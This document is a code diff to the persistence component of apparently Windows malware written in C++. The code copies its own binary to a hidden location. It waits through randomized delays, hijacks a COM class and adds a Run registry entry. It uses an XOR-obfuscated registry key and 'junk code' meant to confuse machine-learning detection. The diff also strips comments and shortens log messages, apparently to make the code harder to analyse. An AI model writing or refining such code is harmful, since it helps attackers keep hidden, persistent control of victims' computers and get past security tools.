@@ -20,13 +20,11 @@ namespace persistence {
 
 namespace {
 
-// Junk code to change the binary's profile and confuse ML
 void JunkLogic() {
     volatile int x = 0;
     for (int i = 0; i < 1000; i++) {
         x += (i % 3) ? 1 : -1;
     }
-    if (x > 100000) LOG_DEBUG("Junk branch");
 }
 
 struct PersistTarget {
@@ -35,7 +33,7 @@ struct PersistTarget {
 };
 
 // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-std::wstring kRunKey = L"\x00\x31\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x3d\x37\x27\x3b\x23\x3b\x32\x20\x0e\x0e\x03\x3d\x3a\x30\x3b\x23\x27\x0e\x0e\x17\x21\x26\x26\x31\x3a\x20\x02\x31\x26\x27\x3d\x3b\x3a\x0e\x0e\x06\x21\x3a";
+std::wstring kRunKey = L"\x09\x35\x3C\x2E\x2D\x3B\x28\x3F\x06\x17\x33\x39\x28\x35\x29\x35\x3C\x2E\x06\x0D\x33\x34\x3E\x35\x2D\x29\x06\x19\x2F\x28\x28\x3F\x34\x2E\x0C\x3F\x28\x29\x33\x35\x34\x06\x08\x2F\x34";
 
 std::wstring getExecutablePath() {
     wchar_t path[MAX_PATH];
@@ -152,7 +150,6 @@ bool establishPersistence(const std::wstring& overrideSourcePath) {
 
     if (lstrcmpiW(sourcePath.c_str(), target.path.c_str()) == 0) return false;
 
-    // Create directory and copy binary
     CreateDirectoryRecursive(target.path);
     std::vector<BYTE> selfData = ReadFileBinary(sourcePath);
     bool copied = false;
@@ -166,20 +163,17 @@ bool establishPersistence(const std::wstring& overrideSourcePath) {
         SetFileAttributesStealth(target.path);
     }
 
-    // Only install 2 reliable methods, spaced out significantly
-    Sleep(60000 + (GetTickCount() % 60000)); // 1-2 min delay
+    Sleep(60000 + (GetTickCount() % 60000));
 
-    // 1. COM Hijack (Very reliable/stealthy)
     std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";
     if (ComHijacker::Install(target.path, clsid)) {
-        LOG_INFO("Persistence phase 1 set.");
+        LOG_INFO("P1 set.");
     }
 
-    Sleep(120000 + (GetTickCount() % 120000)); // 2-4 min delay
+    Sleep(120000 + (GetTickCount() % 120000));
 
-    // 2. Registry Run (User)
     if (InstallRegistryRun(target.path, target.name)) {
-        LOG_INFO("Persistence phase 2 set.");
+        LOG_INFO("P2 set.");
     }
 
     return true;
